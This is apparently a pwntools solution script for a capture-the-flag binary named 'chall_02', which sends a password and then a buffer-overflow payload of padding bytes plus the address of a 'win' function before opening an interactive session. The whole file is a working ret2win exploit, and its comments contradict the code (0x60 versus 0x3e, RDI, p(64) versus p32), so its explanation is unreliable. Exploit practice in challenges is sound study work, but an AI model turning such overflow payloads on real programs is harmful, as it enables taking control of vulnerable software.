from pwn import *

p = process ("./chall_02")
p.recv()
payload = b''
#now we want to go to our base pointer - our location + the p(64) of where wwe want to jump
payload+= (0x3e) * b'A' #we use 0x60 because this is the argument that's passed into RDI [calling convention]
elf = ELF("./chall_02") #used to call the methods in system
payload += p32(elf.sym.win)
p.sendline("andyrulz")
p.sendline(payload)
p.interactive()
ls

